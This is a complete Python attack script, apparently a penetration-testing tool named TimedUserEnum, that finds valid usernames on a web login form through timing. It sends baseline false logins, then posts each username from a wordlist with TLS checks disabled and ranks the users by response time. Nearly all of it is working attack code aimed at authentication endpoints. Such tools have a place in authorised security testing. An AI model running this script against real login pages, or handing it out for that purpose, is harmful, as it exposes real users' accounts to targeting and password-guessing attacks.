#!/usr/bin/env python3
## TimedUserEnum - Determine if username enumeration is possible using
##  HTTP response Times
## 2022 - @RackunSec
import requests ## Making HTTP requests
import sys ## args and exit
import urllib3 ## Used to weed out the SSL/TLS warnings
urllib3.disable_warnings()
from prettytable import PrettyTable ## Tabular output
import statistics ## stats for times
## Display usage of app:
def usage():
    print("\nUsage:\n\t1. Find where credentials post to.")
    print("\t2. Identify the username and password parameter names in the HTML form.")
    print("\t3. Run command:\n\npython3 TimedUserEnum.py (WORDLIST) (USERNAME PARAM) (PASSWORD PARAM) (POST URL)\n")
    sys.exit(1)
## Banner:
def banner():
    print("""
  _____ _             _ _____             _____
 |_   _|_|_____ ___ _| |  |  |___ ___ ___|   __|___ _ _ _____
   | | | |     | -_| . |  |  |_ -| -_|  _|   __|   | | |     |
   |_| |_|_|_|_|___|___|_____|___|___|_| |_____|_|_|___|_|_|_|
              Attacking Logins Using Time ...
    """)
## This class is for storing all response times/users for sorting purposes:
class Timed:
    def __init__(self,user,time):
        self.user = user
        self.time = time
    def __repr__(self):
        return '{"user":"'+self.user+'","time":'+str(self.time)+'}'
## Make an HTTP POST request:
def http_post_time(user,password,userfield,passfield,post_url):
    login_obj = {userfield:user,passfield:password}
    response = requests.post(post_url,json=login_obj,verify=False)
    response.close()
    return response.elapsed.total_seconds()
## Our main workflow:
def main():
    if len(sys.argv) != 5:
        usage()
    else:
        banner()
        post_url = sys.argv[4]
        userfield = sys.argv[2]
        passfield = sys.argv[3]
        userlist = sys.argv[1]
        times = []
        print(f"[i] Attacking {post_url} with params:\n\tUsername Field: {userfield}\n\tPassword Field: {passfield}\n")
        print("[i] Generating False/False login for response time check ... ")
        ## Generate a known bad login:
        false_times = []
        false_times.append(http_post_time("6df23dc03f9b54cc38a0fc1483df6e21","6df23dc03f9b54cc38a0fc1483df6e21",userfield,passfield,post_url))
        false_times.append(http_post_time("eb49e6f3bd72e6c6da517774391e0441","eb49e6f3bd72e6c6da517774391e0441",userfield,passfield,post_url))
        false_times.append(http_post_time("5607a7cc6f4dbb7b2082c4b734f536cb","5607a7cc6f4dbb7b2082c4b734f536cb",userfield,passfield,post_url))
        false_times.append(http_post_time("40a1eab90f5b758243ef2ba158cb6917","40a1eab90f5b758243ef2ba158cb6917",userfield,passfield,post_url))
        avg_time = statistics.mean(false_times)
        print(f"[i] Got False/False avg time of {avg_time}")
        print(f"[i] Running through username list now ... \n")
        with open(userlist) as usernames:
            for user in usernames:
                user = user.strip() # clean it up
                timed_response = http_post_time(user,"180640738568e4ac927d47e75e705b7d",userfield,passfield,post_url)
                times.append(Timed(user,timed_response)) # Append objects to array for sorting

        table = PrettyTable() ## Generate a table for tabular output.
        table.align="l" ## Left align data, please.
        table.field_names = ["#","Username","Response Time"] ## Add table head.
        for enum in enumerate(sorted(times,key=lambda x:x.time,reverse=True)):
            table.add_row([enum[0],enum[1].user,enum[1].time]) ## Add row to table.
        print(table) ## Print table.
        print("\n[i] Completed. All usernames sorted above.")
    return
    
## Are we runing as a script?:
if __name__ == "__main__":
    main()
